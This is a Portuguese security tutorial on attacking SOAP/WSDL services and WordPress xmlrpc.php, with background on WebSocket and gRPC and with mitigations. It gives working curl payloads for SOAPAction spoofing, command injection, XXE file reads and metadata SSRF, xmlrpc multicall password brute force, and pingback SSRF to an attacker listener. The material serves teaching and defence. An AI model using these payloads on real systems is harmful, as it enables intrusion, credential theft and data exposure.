---
title: "Web Service Attacks"
---

# Ataques em Web Services (SOAP, WSDL, WordPress xmlrpc)

# O que é?

Este arquivo cobre três protocolos e tecnologias de comunicação web distintas, cada uma com modelo de segurança próprio:

## (1) SOAP — Simple Object Access Protocol

SOAP é um protocolo de mensageria baseado em XML para comunicação entre sistemas distribuídos. É um padrão W3C (World Wide Web Consortium), definido formalmente e amplamente adotado em ambientes enterprise e legados. Diferente de REST (que é um estilo arquitetural sem especificação formal), SOAP define um protocolo estrito com:

- **Envelope XML**: estrutura obrigatória que envolve toda mensagem SOAP, contendo Header e Body
- **Header**: metadados opcionais (autenticação, contexto de transação, roteamento)
- **Body**: carga útil da mensagem — a requisição ou resposta real
- **Fault**: estrutura padronizada para comunicação de erros no Body

O contrato de um serviço SOAP é descrito por um arquivo **WSDL (Web Services Description Language)**, que especifica todas as operações disponíveis, os tipos de dados aceitos e retornados, os endpoints e os protocolos de binding (HTTP, SMTP, etc.). O WSDL funciona como a documentação técnica completa e legível por máquina do serviço.

A comunicação SOAP usa tipicamente HTTP/HTTPS como transporte, mas o protocolo é independente do transporte — pode rodar sobre SMTP, TCP, etc. O header HTTP `SOAPAction` indica qual operação executar, mas esse header é apenas uma dica e não é enforçado pelo protocolo de forma automática.

## (2) WebSocket — Protocolo Full-Duplex sobre TCP

WebSocket é um protocolo de comunicação full-duplex definido na RFC 6455 que opera sobre uma única conexão TCP persistente. Diferente do HTTP, que é baseado em requisição-resposta (half-duplex), WebSocket permite que tanto cliente quanto servidor enviem mensagens a qualquer momento, de forma independente e simultânea.

O estabelecimento da conexão começa com um HTTP Upgrade handshake: o cliente envia uma requisição HTTP com headers especiais (`Upgrade: websocket`, `Connection: Upgrade`, `Sec-WebSocket-Key`), e se o servidor aceitar, responde com HTTP 101 Switching Protocols. A partir desse momento, a conexão TCP é mantida aberta e os dados fluem como frames WebSocket — não mais como HTTP.

Características fundamentais:
- **Full-duplex**: cliente e servidor enviam mensagens simultaneamente sem aguardar resposta
- **Conexão persistente**: elimina overhead de estabelecer nova conexão a cada mensagem
- **Frames leves**: overhead de protocolo muito menor que HTTP para mensagens frequentes
- **Suporte nativo em browsers**: API `WebSocket` disponível em todos os browsers modernos
- **Sem CORS automático**: o handshake não aplica política de same-origin do navegador da mesma forma que fetch/XHR

## (3) gRPC — Google Remote Procedure Call

gRPC é um framework de RPC (Remote Procedure Call) open-source desenvolvido pelo Google, lançado em 2016. Ao contrário de REST (que usa JSON sobre HTTP/1.1) e SOAP (que usa XML), gRPC usa **Protocol Buffers** (protobuf) — um formato de serialização binária, mais compacto e eficiente que JSON/XML — e **HTTP/2** como transporte.

O contrato de uma API gRPC é definido em arquivos `.proto` (Interface Definition Language), que descrevem os serviços, métodos disponíveis e os tipos de mensagem. O compilador `protoc` gera código cliente e servidor automaticamente em mais de 10 linguagens (Go, Java, Python, Node.js, C++, etc.).

Tipos de streaming suportados:
- **Unary RPC**: uma requisição, uma resposta (similar a REST)
- **Server streaming**: uma requisição, múltiplas respostas em stream
- **Client streaming**: múltiplas requisições em stream, uma resposta
- **Bidirectional streaming**: ambos os lados enviam streams simultaneamente

---

# Onde é implementado?

## SOAP

SOAP domina em ambientes enterprise e legados onde contratos formais e confiabilidade são prioritários:

- **Sistemas bancários e financeiros legados**: mainframes IBM, sistemas COBOL com interfaces SOAP para integração moderna. Bancos brasileiros ainda expõem SOAP para integração com parceiros B2B
- **ERP e sistemas de gestão**: SAP NetWeaver expõe web services SOAP; Oracle E-Business Suite usa SOAP para integrações; Microsoft Dynamics legado
- **Serviços governamentais**: Receita Federal Brasileira (NFe, NFSe), SEFAZ (emissão de notas fiscais), eSocial, integrações com sistemas públicos
- **Sistemas de saúde**: HL7/FHIR em implementações legadas, integração entre hospitais e planos de saúde, TISS (Troca de Informações em Saúde Suplementar) da ANS
- **Integrações B2B enterprise**: EDI (Electronic Data Interchange), conectores entre ERP de fornecedores e clientes, integração com seguradoras
- **Serviços de telecomunicações**: operadoras de telefonia expõem SOAP para portabilidade numérica, consulta de crédito, etc.

## WebSocket

WebSocket é adotado sempre que comunicação bidirecional em tempo real é necessária:

- **Chats e mensageria em tempo real**: Slack, Discord, WhatsApp Web — todos usam WebSocket para entrega instantânea de mensagens
- **Trading platforms e mercados financeiros**: B3 (Bolsa brasileira), plataformas de corretoras expõem feeds de preço via WebSocket; trading de alta frequência depende de latência mínima
- **Jogos multiplayer**: sincronização de estado de jogo entre jogadores em tempo real; engines como Colyseus e Socket.IO são baseados em WebSocket
- **Notificações push em aplicações web**: avisos de novos emails, alertas de sistema, atualizações de pedido
- **Dashboards e monitoramento ao vivo**: Grafana com plugin WebSocket, dashboards de IoT, monitoramento de infraestrutura em tempo real
- **Colaboração em documentos**: Google Docs, Notion, Figma — sincronização de edições simultâneas de múltiplos usuários
- **Suporte ao vivo / chat de atendimento**: Zendesk, Intercom e similares usam WebSocket para chat em tempo real

## gRPC

gRPC é dominante em comunicação interna entre microserviços e sistemas de alto throughput:

- **Google internamente**: o próprio Google usa gRPC para comunicação entre praticamente todos seus microserviços internos (Search, Maps, YouTube, etc.)
- **Kubernetes e ecossistema Cloud Native**: a API do Kubernetes usa protobuf/gRPC internamente; etcd (banco de dados distribuído do Kubernetes) usa gRPC; Envoy proxy usa xDS API via gRPC
- **Sistemas de ML serving**: TensorFlow Serving, Triton Inference Server (NVIDIA) expõem APIs gRPC para inferência de modelos
- **Telemetria e observabilidade**: OpenTelemetry usa gRPC (OTLP — OpenTelemetry Protocol) para exportar traces, métricas e logs
- **APIs de alto throughput**: quando JSON seria muito pesado — sistemas que precisam de centenas de milhares de RPC/segundo
- **Sistemas financeiros modernos**: bolsas de valores modernas e plataformas de pagamento usando gRPC para latência sub-milissegundo
- **Streaming de dados**: pipelines de dados em tempo real onde HTTP/2 multiplexing é crítico

---

# Como funciona de forma adequada?

## SOAP — Estrutura e Fluxo

O envelope SOAP define uma hierarquia XML rígida que todo parser deve respeitar:

```
ENVELOPE SOAP
┌─────────────────────────────────────────────────┐
│ <soapenv:Envelope                               │
│   xmlns:soapenv="http://schemas.xmlsoap.org/    │
│                  soap/envelope/">               │
│                                                 │
│  ┌───────────────────────────────────────────┐  │
│  │ <soapenv:Header>                          │  │
│  │   <!-- Metadados: autenticação,           │  │
│  │        transação, roteamento -->          │  │
│  │   <auth:Token>Bearer xyz123</auth:Token>  │  │
│  │ </soapenv:Header>                         │  │
│  └───────────────────────────────────────────┘  │
│                                                 │
│  ┌───────────────────────────────────────────┐  │
│  │ <soapenv:Body>                            │  │
│  │   <!-- A requisição/resposta real -->     │  │
│  │   <getUser>                               │  │
│  │     <userId>42</userId>                   │  │
│  │   </getUser>                              │  │
│  │ </soapenv:Body>                           │  │
│  └───────────────────────────────────────────┘  │
│                                                 │
│  [Em caso de erro, Body contém Fault:]          │
│  ┌───────────────────────────────────────────┐  │
│  │ <soapenv:Body>                            │  │
│  │   <soapenv:Fault>                         │  │
│  │     <faultcode>Client</faultcode>         │  │
│  │     <faultstring>Não autorizado           │  │
│  │     </faultstring>                        │  │
│  │   </soapenv:Fault>                        │  │
│  │ </soapenv:Body>                           │  │
│  └───────────────────────────────────────────┘  │
└─────────────────────────────────────────────────┘
```

**WSDL como contrato formal:**

```xml
<!-- Fragmento de WSDL descrevendo o serviço -->
<definitions name="UserService"
  targetNamespace="http://example.com/users">

  <!-- Tipos de dados -->
  <types>
    <xs:schema>
      <xs:element name="GetUserRequest">
        <xs:complexType>
          <xs:sequence>
            <xs:element name="userId" type="xs:int"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="GetUserResponse">
        <xs:complexType>
          <xs:sequence>
            <xs:element name="username" type="xs:string"/>
            <xs:element name="email" type="xs:string"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
    </xs:schema>
  </types>

  <!-- Operações disponíveis -->
  <portType name="UserServicePortType">
    <operation name="getUser">
      <input message="tns:GetUserRequest"/>
      <output message="tns:GetUserResponse"/>
    </operation>
    <operation name="deleteUser">
      <input message="tns:DeleteUserRequest"/>
      <output message="tns:DeleteUserResponse"/>
    </operation>
  </portType>

  <!-- Endpoint do serviço -->
  <service name="UserService">
    <port name="UserServicePort" binding="tns:UserServiceBinding">
      <soap:address location="https://api.example.com/soap/users"/>
    </port>
  </service>
</definitions>
```

**Implementação segura — validação de SOAPAction e autorização:**

```python
# Servidor SOAP seguro: validar consistência entre SOAPAction e body
def handle_soap_request(request):
    soap_action = request.headers.get('SOAPAction', '').strip('"')
    body_operation = extract_operation_from_xml_body(request.body)

    # 1. Verificar consistência entre header e body
    if soap_action != body_operation:
        return soap_fault("Client", "SOAPAction inconsistente com operação no body")

    # 2. Parser XML seguro — sem DTD, sem entidades externas
    root = parse_xml_safely(request.body)

    # 3. Verificar autorização para a operação específica
    if not user_has_permission(request.user, soap_action):
        return soap_fault("Client", "Não autorizado")

    # 4. Processar e retornar
    return dispatch_operation(soap_action, root, request.user)
```

## WebSocket — Handshake e Comunicação

O processo de upgrade de HTTP para WebSocket e o fluxo de comunicação bidirecional:

```
CLIENTE (Browser)                    SERVIDOR
     |                                   |
     |  HTTP GET /ws                     |
     |  Host: example.com                |
     |  Upgrade: websocket               |
     |  Connection: Upgrade              |
     |  Sec-WebSocket-Key: dGhlc2...     |
     |  Sec-WebSocket-Version: 13        |
     |---------------------------------->|
     |                                   |
     |           HTTP 101 Switching Protocols
     |           Upgrade: websocket      |
     |           Connection: Upgrade     |
     |           Sec-WebSocket-Accept:   |
     |           s3pPLMBiTxaQ9...        |
     |<----------------------------------|
     |                                   |
     |  === CONEXÃO WS PERSISTENTE ===   |
     |                                   |
     |  Frame: {"type":"chat",           |
     |           "msg":"Olá!"}           |
     |---------------------------------->|
     |                                   |
     |           Frame: {"type":"chat",  |
     |                   "msg":"Oi!"}    |
     |<----------------------------------|
     |                                   |
     |  Frame: {"type":"ping"}           |
     |---------------------------------->|
     |           Frame: {"type":"pong"}  |
     |<----------------------------------|
     |                                   |
     |  [Conexão persiste indefinidamente|
     |   até fechar explicitamente]      |
     |                                   |
     |  Close Frame (código 1000)        |
     |---------------------------------->|
     |           Close Frame ACK         |
     |<----------------------------------|
```

**Implementação segura em Node.js:**

```javascript
const WebSocket = require('ws');
const jwt = require('jsonwebtoken');

const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', function(ws, req) {
  // 1. Verificar autenticação via token no handshake
  const token = extractTokenFromRequest(req);
  const user = jwt.verify(token, process.env.JWT_SECRET);

  if (!user) {
    ws.close(1008, 'Não autenticado');
    return;
  }

  // 2. Verificar Origin para prevenir CSWSH
  const origin = req.headers['origin'];
  const allowedOrigins = ['https://meusite.com', 'https://app.meusite.com'];
  if (!allowedOrigins.includes(origin)) {
    ws.close(1008, 'Origin não permitida');
    return;
  }

  ws.userId = user.id;

  ws.on('message', function(message) {
    // 3. Validar e parsear mensagem
    let data;
    try {
      data = JSON.parse(message);
    } catch (e) {
      ws.send(JSON.stringify({ error: 'Mensagem inválida' }));
      return;
    }

    // 4. Autorizar ação específica
    if (data.type === 'sendMessage') {
      if (!canSendToRoom(ws.userId, data.roomId)) {
        ws.send(JSON.stringify({ error: 'Não autorizado para esta sala' }));
        return;
      }
      broadcastToRoom(data.roomId, data.content, ws.userId);
    }
  });
});
```

## gRPC — Definição e Geração de Código

O fluxo completo desde a definição protobuf até a comunicação HTTP/2:

```
DEFINIÇÃO (.proto)              CÓDIGO GERADO              RUNTIME
┌──────────────────┐           ┌─────────────────┐
│ syntax = "proto3";│  protoc  │ Client Stub      │
│                  │ ────────> │ (gerado auto)    │
│ service UserSvc { │          │                  │
│  rpc GetUser     │          │ - GetUser()       │
│   (UserReq)      │          │ - ListUsers()     │
│   returns(User); │          │ - CreateUser()    │
│                  │          └─────────────────┘
│  rpc ListUsers   │           ┌─────────────────┐
│   (ListReq)      │  protoc  │ Server Skeleton  │
│   returns(stream │ ────────> │ (gerado auto)    │
│    User);        │          │                  │
│ }                │          │ - Implemente os  │
│                  │          │   métodos aqui   │
│ message UserReq {│          └─────────────────┘
│   string id = 1; │
│ }                │
│                  │
│ message User {   │
│   string id = 1; │
│   string name=2; │
│   string email=3;│
│ }                │
└──────────────────┘

CLIENTE                              SERVIDOR
   |                                    |
   | HTTP/2 POST                        |
   | /UserService/GetUser               |
   | Content-Type: application/grpc     |
   | [binário protobuf serializado]     |
   |----------------------------------->|
   |                                    |
   |           HTTP/2 200 OK            |
   |           [binário protobuf]       |
   |<-----------------------------------|
   |                                    |
   | [Streaming: múltiplos frames H2]   |
   |--->---->---->---->---->----------->|
   |<---<----<----<----<----<-----------|
```

**Exemplo de arquivo .proto:**

```protobuf
syntax = "proto3";

package userservice;

// Definição do serviço
service UserService {
  // Unary RPC
  rpc GetUser (GetUserRequest) returns (User);

  // Server streaming — retorna stream de usuários
  rpc ListUsers (ListUsersRequest) returns (stream User);

  // Client streaming — envia stream de criações em batch
  rpc CreateUsersBatch (stream CreateUserRequest) returns (BatchResult);

  // Bidirectional streaming — chat em tempo real
  rpc Chat (stream ChatMessage) returns (stream ChatMessage);
}

// Mensagens (tipos)
message GetUserRequest {
  string user_id = 1;
}

message User {
  string id = 1;
  string username = 2;
  string email = 3;
  string role = 4;
  int64 created_at = 5;
}

message ListUsersRequest {
  int32 limit = 1;
  int32 offset = 2;
  string role_filter = 3;
}

message CreateUserRequest {
  string username = 1;
  string email = 2;
  string password = 3;
}

message BatchResult {
  int32 created_count = 1;
  repeated string errors = 2;
}
```

**Implementação segura em Go:**

```go
// Servidor gRPC com autenticação via interceptor
func main() {
    // Interceptor de autenticação aplicado a TODOS os métodos
    authInterceptor := func(ctx context.Context, req interface{},
        info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (interface{}, error) {

        // Extrair token dos metadata
        md, ok := metadata.FromIncomingContext(ctx)
        if !ok {
            return nil, status.Error(codes.Unauthenticated, "metadata ausente")
        }

        tokens := md.Get("authorization")
        if len(tokens) == 0 {
            return nil, status.Error(codes.Unauthenticated, "token ausente")
        }

        user, err := validateJWT(tokens[0])
        if err != nil {
            return nil, status.Error(codes.Unauthenticated, "token inválido")
        }

        // Injetar usuário no contexto para uso nos handlers
        ctx = context.WithValue(ctx, userKey, user)
        return handler(ctx, req)
    }

    // TLS obrigatório — gRPC deve sempre usar TLS em produção
    creds, _ := credentials.NewServerTLSFromFile("cert.pem", "key.pem")

    grpcServer := grpc.NewServer(
        grpc.Creds(creds),
        grpc.UnaryInterceptor(authInterceptor),
    )

    pb.RegisterUserServiceServer(grpcServer, &UserServiceImpl{})
    grpcServer.Serve(listener)
}
```

**Benefícios de cada tecnologia quando usada corretamente:**

| Tecnologia | Pontos Fortes | Casos de Uso Ideais |
|---|---|---|
| SOAP | Contrato formal (WSDL), WS-Security, transações distribuídas | Integração enterprise, sistemas legados, conformidade regulatória |
| WebSocket | Full-duplex, baixa latência, conexão persistente | Chat, jogos, dashboards live, notificações push |
| gRPC | Binário eficiente, tipagem forte, streaming, HTTP/2 multiplexing | Microserviços internos, alta throughput, multi-linguagem |

---

## A Falha: Protocolos Alternativos com Superfície de Ataque Diferente de HTTP/REST

Web Services SOAP e endpoints legados como WordPress `xmlrpc.php` continuam ativos em empresas que não modernizaram sua infraestrutura. Mas o problema não é apenas que são antigos — é que cada protocolo tem um modelo de segurança próprio que os desenvolvedores frequentemente não implementam corretamente.

A suposição de design errada: o desenvolvedor protege a aplicação web principal com WAF, rate limiting e autenticação robusta, mas deixa o endpoint SOAP ou `xmlrpc.php` exposto sem os mesmos controles, assumindo que "não é usado" ou "ninguém vai encontrar".

**Perspectiva do desenvolvedor vs. da realidade:**

Para SOAP: o desenvolvedor pensa que validar a operação via `SOAPAction` header é suficiente. Mas o header `SOAPAction` é apenas uma dica — não é enforçado pelo protocolo. O corpo XML pode conter qualquer operação, e se o parser processar o body XML antes de validar o header, o atacante bypassa o controle.

Para WebSocket: o desenvolvedor implementa proteção SameSite em cookies para CSRF em HTTP, mas WebSocket não tem esse mecanismo automático. Uma página maliciosa pode abrir uma conexão WebSocket para o servidor usando as credenciais do usuário — o que se chama de Cross-Site WebSocket Hijacking (CSWSH).

Para consumo inseguro de APIs: quando uma aplicação consome dados de uma API de terceiros e os passa diretamente para o banco de dados sem validação, ela herda vulnerabilidades do terceiro. Um exemplo é NoSQL injection via cupom validado por sistema externo — o código de cupom vem do terceiro sem sanitização e chega direto ao MongoDB.

O fato de serem "legacy" não significa menos severidade — frequentemente significa **menos monitoramento** e **mais tempo com vulnerabilidades abertas**.

São alvos frequentes em:
- Aplicações enterprise (SAP, Oracle, IBM) que expõem SOAP externamente
- WordPress sites (que representam ~40% da web) com xmlrpc habilitado
- APIs internas que migraram para REST mas mantiveram SOAP ativo
- Serviços de integração entre sistemas (EDI, ERP, CRM)

---

## Causa Raiz

### SOAP — SOAPAction Não é Enforçado pelo Protocolo

```xml
<!-- O que o desenvolvedor valida: o header SOAPAction -->
SOAPAction: "getUser"

<!-- O que o atacante envia no header -->
SOAPAction: "getUser"

<!-- O que o atacante coloca no body -->
<soap:Body>
  <deleteUser><userId>42</userId></deleteUser>
</soap:Body>

<!-- Se o servidor valida SOAPAction mas processa o body sem verificar
     consistencia entre header e body, a operacao deleteUser e executada -->
```

```python
# SEGURO — validar que a operacao no body corresponde ao SOAPAction
def handle_soap_request(request):
    soap_action = request.headers.get('SOAPAction', '').strip('"')
    body_operation = extract_operation_from_body(request.body)

    if soap_action != body_operation:
        raise ValueError(f"SOAPAction '{soap_action}' nao corresponde a operacao no body '{body_operation}'")

    # Validar que o usuario tem permissao para soap_action
    if not user_has_permission(request.user, soap_action):
        raise PermissionError(f"Usuario nao autorizado para: {soap_action}")
```

### SOAP/XML — Parser sem Desabilitação de DTD Abre XXE

```python
# VULNERAVEL — parser XML sem restricao de entidades externas
from lxml import etree

def parse_soap_body(xml_string):
    parser = etree.XMLParser()  # DTD habilitado por padrao
    root = etree.fromstring(xml_string.encode(), parser)
    return root

# SEGURO — desabilitar DTD e entidades externas
def parse_soap_body_safe(xml_string):
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        dtd_validation=False,
        load_dtd=False
    )
    root = etree.fromstring(xml_string.encode(), parser)
    return root
```

### Consumo Inseguro de APIs — Confiar no Terceiro sem Validar

O endpoint de validação de cupom passa o input do terceiro diretamente ao MongoDB:

```javascript
// VULNERAVEL — passa o cupom_code do terceiro direto ao banco
async function validateCoupon(couponCode) {
    // couponCode veio de API de terceiros sem validacao
    const coupon = await db.collection('coupons').findOne({
        code: couponCode  // se couponCode = {$ne: "x"}, retorna tudo
    });
    return coupon;
}

// SEGURO — validar tipo e formato antes de usar na query
async function validateCoupon(couponCode) {
    // Garantir que e uma string alfanumerica simples
    if (typeof couponCode !== 'string' || !/^[A-Z0-9]{6,12}$/.test(couponCode)) {
        throw new Error('Formato de cupom invalido');
    }
    const coupon = await db.collection('coupons').findOne({ code: couponCode });
    return coupon;
}
```

---

## Arquitetura SOAP: Protocolo, WSDL e SOAPAction

### SOAP (Simple Object Access Protocol)

SOAP é um protocolo baseado em XML que define estrutura de mensagens para comunicação entre sistemas.

```xml
<!-- Estrutura de uma mensagem SOAP -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <!-- Autenticação, contexto, etc. -->
  </soapenv:Header>
  <soapenv:Body>
    <!-- A requisição/resposta real -->
    <getUser>
      <userId>42</userId>
    </getUser>
  </soapenv:Body>
</soapenv:Envelope>
```

### WSDL (Web Services Description Language)

O WSDL é o "manual" do web service - descreve todos os métodos disponíveis, parâmetros e tipos de dados.

```bash
# Recuperar WSDL (geralmente acessível publicamente)
curl http://TARGET/service?wsdl
curl http://TARGET/api.asmx?wsdl
curl http://TARGET/ws/service.php?wsdl
```

### SOAPAction Header

O header `SOAPAction` indica qual operação SOAP executar - e é frequentemente mal validado:

```
SOAPAction: "getUser"
SOAPAction: "deleteUser"  # Mesmo sem autorização?
SOAPAction: ""            # Vazio permite qualquer ação?
```

---

## Na Prática

### 1. Descoberta de Web Services

```bash
# Procurar WSDL e endpoints SOAP
ffuf -w /opt/SecLists/Discovery/Web-Content/common.txt \
     -u http://TARGET/FUZZ \
     -mc 200 \
     -fc 404 | grep -i -E "wsdl|soap|asmx|svc|jws"

# Extensões comuns de SOAP/Web Services
# .asmx  (ASP.NET)
# .svc   (WCF)
# .jws   (Axis)
# .php   (PHP SOAP)
# ?wsdl  (qualquer plataforma)

# Usando nikto para detecção de SOAP
nikto -h http://TARGET -C all | grep -i soap
```

### 2. Enumeração via WSDL

```bash
# Baixar e analisar WSDL
curl -s "http://TARGET/service?wsdl" > service.wsdl
cat service.wsdl | grep -E "operation|message|portType" | head -50

# Usar python-zeep para listar operações
python3 << 'EOF'
from zeep import Client
client = Client('http://TARGET/service?wsdl')
print(client.service._binding._operations)
# Lista todas as operações disponíveis
EOF
```

### 3. SOAPAction Spoofing (Bypass de Controle de Acesso)

```bash
# Cenário: endpoint que só permite 'getUser' mas não valida SOAPAction adequadamente

# Requisição normal (permitida)
curl -X POST http://TARGET/service \
     -H "Content-Type: text/xml" \
     -H 'SOAPAction: "getUser"' \
     -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser><userId>1</userId></getUser>
  </soap:Body>
</soap:Envelope>'

# SOAPAction spoofing - executar operação diferente
curl -X POST http://TARGET/service \
     -H "Content-Type: text/xml" \
     -H 'SOAPAction: "deleteUser"' \
     -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <deleteUser><userId>42</userId></deleteUser>
  </soap:Body>
</soap:Envelope>'

# Ou com SOAPAction vazio para bypass
curl -X POST http://TARGET/service \
     -H "Content-Type: text/xml" \
     -H 'SOAPAction: ""' \
     -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <executeCommand><cmd>id</cmd></executeCommand>
  </soap:Body>
</soap:Envelope>'
```

### 4. Injeção de Comando via SOAP

```bash
# Se parâmetros SOAP são passados para comandos do sistema sem sanitização
curl -X POST http://TARGET/service \
     -H "Content-Type: text/xml" \
     -H 'SOAPAction: "ping"' \
     -d '<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ping>
      <host>127.0.0.1; id; whoami</host>
    </ping>
  </soap:Body>
</soap:Envelope>'

# Versão com backtick
curl -X POST http://TARGET/service \
     -H "Content-Type: text/xml" \
     -H 'SOAPAction: "ping"' \
     -d '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ping><host>`id`</host></ping>
  </soap:Body>
</soap:Envelope>'
```

### 5. XXE em Web Services SOAP

```bash
# XXE via body SOAP - ler arquivo local
curl -X POST http://TARGET/service \
     -H "Content-Type: text/xml" \
     -H 'SOAPAction: "getUser"' \
     -d '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <userId>&xxe;</userId>
    </getUser>
  </soap:Body>
</soap:Envelope>'

# XXE para SSRF via SOAP
curl -X POST http://TARGET/service \
     -H "Content-Type: text/xml" \
     -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><test>&xxe;</test></soap:Body>
</soap:Envelope>'
```

---

## WordPress xmlrpc.php

### Como Funciona

O `xmlrpc.php` é um endpoint legacy do WordPress que permite controle remoto via XML-RPC. Habilitado por padrão em versões antigas, é um vetor de ataque poderoso.

```bash
# Verificar se está habilitado
curl -I http://TARGET/xmlrpc.php
# HTTP/1.1 200 OK → habilitado!
# HTTP/1.1 404 Not Found → desabilitado ou removido

# Confirmar funcionamento
curl -X POST http://TARGET/xmlrpc.php \
     -H "Content-Type: text/xml" \
     -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>'
```

### Listar Métodos Disponíveis

```bash
# Enumeração de métodos disponíveis
curl -X POST http://TARGET/xmlrpc.php \
     -H "Content-Type: text/xml" \
     -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>'

# Métodos importantes:
# wp.getUsersBlogs - valida credenciais
# wp.getUsers     - enumera usuários (requer auth)
# wp.getPosts     - lista posts (inclui drafts com auth)
# wp.newPost      - criar posts
# wp.editPost     - editar posts
# wp.deletePost   - deletar posts
# pingback.ping   - dispara pingbacks (SSRF/DoS)
# system.multicall - múltiplas chamadas em uma (bypass rate limit)
```

### 6. Brute Force via xmlrpc.php (system.multicall)

```bash
# system.multicall permite múltiplas autenticações em UMA requisição HTTP
# Bypass eficiente de rate limiting por IP

curl -X POST http://TARGET/xmlrpc.php \
     -H "Content-Type: text/xml" \
     -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param><value><array><data>
      <value><struct>
        <member>
          <name>methodName</name>
          <value><string>wp.getUsersBlogs</string></value>
        </member>
        <member>
          <name>params</name>
          <value><array><data>
            <value><string>admin</string></value>
            <value><string>password1</string></value>
          </data></array></value>
        </member>
      </struct></value>
      <value><struct>
        <member>
          <name>methodName</name>
          <value><string>wp.getUsersBlogs</string></value>
        </member>
        <member>
          <name>params</name>
          <value><array><data>
            <value><string>admin</string></value>
            <value><string>password2</string></value>
          </data></array></value>
        </member>
      </struct></value>
    </data></array></value></param>
  </params>
</methodCall>'

# Script automatizado com WPScan
wpscan --url http://TARGET --enumerate u --passwords /usr/share/wordlists/rockyou.txt
```

### 7. SSRF via Pingback (xmlrpc.php)

```bash
# pingback.ping força o WordPress a fazer uma requisição HTTP para URL arbitrária
# Revela IP real do servidor (bypassando Cloudflare)
# Pode fazer SSRF para redes internas

curl -X POST http://TARGET/xmlrpc.php \
     -H "Content-Type: text/xml" \
     -d '<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param>
      <value><string>http://SEU_SERVIDOR:8080/log</string></value>
    </param>
    <param>
      <value><string>http://TARGET/qualquer-post/</string></value>
    </param>
  </params>
</methodCall>'

# Listener para capturar o IP real
nc -lvnp 8080

# SSRF para recursos internos
curl -X POST http://TARGET/xmlrpc.php \
     -H "Content-Type: text/xml" \
     -d '<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://192.168.1.1/admin</string></value></param>
    <param><value><string>http://TARGET/post-qualquer/</string></value></param>
  </params>
</methodCall>'
```

### 8. Enumeração de Usuários via xmlrpc.php

```bash
# wp.getAuthors ou wp.getUsers para listar usuários
curl -X POST http://TARGET/xmlrpc.php \
     -H "Content-Type: text/xml" \
     -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsers</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <value><string>admin</string></value>
    <value><string>SENHA_VALIDA</string></value>
  </params>
</methodCall>'

# Alternativa: REST API do WordPress (se habilitada)
curl "http://TARGET/wp-json/wp/v2/users"
# Retorna lista de usuários sem autenticação!
```

### 9. Exploração com wpscan e xmlrpc

```bash
# Scan completo de WordPress
wpscan --url http://TARGET \
       --enumerate u,p,t \
       --plugins-detection aggressive \
       --api-token SEU_TOKEN_WPSCAN

# Brute force via xmlrpc (mais rápido que via login form)
wpscan --url http://TARGET \
       --usernames admin,administrator,wp-admin \
       --passwords /usr/share/wordlists/rockyou.txt \
       --password-attack xmlrpc-multicall

# Enumeração de plugins vulneráveis
wpscan --url http://TARGET \
       --enumerate vp \
       --plugins-detection aggressive
```

---

## Ferramentas

| Ferramenta | Uso | Comando |
|---|---|---|
| **wpscan** | Scanner WordPress | `wpscan --url TARGET` |
| **SoapUI** | Teste de Web Services SOAP | GUI |
| **zeep** | Cliente SOAP Python | `from zeep import Client` |
| **Burp Suite** | Interceptar e modificar SOAP | Proxy |
| **xmlrpc-bruteforcer** | Brute force específico | `python xmlrpc-brute.py` |
| **WPSeku** | Scanner WordPress alternativo | `python wpseku.py -u URL` |
| **droopescan** | Scanner Drupal/WordPress | `droopescan scan -u URL` |

```bash
# Instalação do wpscan
gem install wpscan
# ou
docker run -it --rm wpscanteam/wpscan --url http://TARGET

# python-zeep para SOAP
pip3 install zeep
python3 -c "
from zeep import Client
client = Client('http://TARGET/service?wsdl')
# Listar todos os métodos
for svc in client.wsdl.services.values():
    for port in svc.ports.values():
        for op in port.binding._operations.values():
            print(f'{op.name}: {op.input.body.type}')
"
```

---

## Detecção e Mitigação

### Indicadores de Ataque

| Sinal | Tipo de Ataque |
|---|---|
| Muitas requisições POST para `/xmlrpc.php` | Brute force via multicall |
| `system.multicall` no body | Brute force otimizado |
| `pingback.ping` com URLs externas | SSRF / reconhecimento |
| SOAPAction headers incomuns | SOAPAction spoofing |
| DOCTYPE em body XML | XXE injection |
| `__schema` em requisição GraphQL | Enumeração de schema |
| Queries GraphQL muito aninhadas | DoS por complexidade |

### Mitigações

```yaml
WordPress xmlrpc.php:
  - Desabilitar completamente se não usado:
    # Em .htaccess
    <Files xmlrpc.php>
      order deny,allow
      deny from all
    </Files>
  - Ou via plugin: Disable XML-RPC
  - Limitar IPs que podem acessar xmlrpc.php
  - Monitorar e alertar em acessos

SOAP Web Services:
